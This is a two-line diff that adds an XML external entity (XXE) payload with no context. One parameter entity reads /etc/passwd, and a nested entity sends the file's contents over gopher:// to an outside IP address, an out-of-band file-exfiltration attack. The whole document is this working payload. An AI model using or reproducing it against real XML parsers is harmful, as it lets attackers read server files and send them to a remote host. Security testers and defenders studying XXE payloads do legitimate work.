@@ -1,0 +1,2 @@
+<!ENTITY % a SYSTEM "file:///etc/passwd"> 
+<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://203.91.112.86/dashboard/%a;'>"> %b; %c
